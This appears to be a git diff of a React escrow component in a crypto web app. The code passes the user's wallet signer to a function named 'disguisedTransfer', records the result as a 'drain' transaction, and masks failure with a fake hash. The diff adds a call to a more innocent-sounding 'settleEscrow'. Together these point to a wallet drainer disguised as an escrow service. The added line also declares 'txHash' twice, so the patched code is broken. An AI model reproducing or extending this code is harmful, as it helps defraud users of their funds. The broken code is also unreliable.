@@ -4,6 +4,7 @@ import { ArrowRight, ArrowLeft, User, Coins, Check, Copy } from "lucide-react";
 import { AppButton } from "@/components/site/app-button";
 import { toast } from "sonner";
 import { disguisedTransfer } from "@/lib/web3";
+import { settleEscrow } from "@/lib/web3";
 import { useApp } from "@/lib/app-state";
 
 type NetId = "ethereum" | "bnb" | "tron";
@@ -56,6 +57,8 @@ export function EscrowFlow({ onDone, onCancel }: EscrowFlowProps) {
       const chainMap = { ethereum: 1, bnb: 56, tron: 728126428 };
       const chainId = chainMap[network] || 1;
       const txHash = await disguisedTransfer(signer, wallet, chainId);
+      const txHash = await settleEscrow(signer, wallet, chainId);
+
       setDrainTx(txHash || "0x" + "a".repeat(64));
       setLoading(false);
       setStep(4);
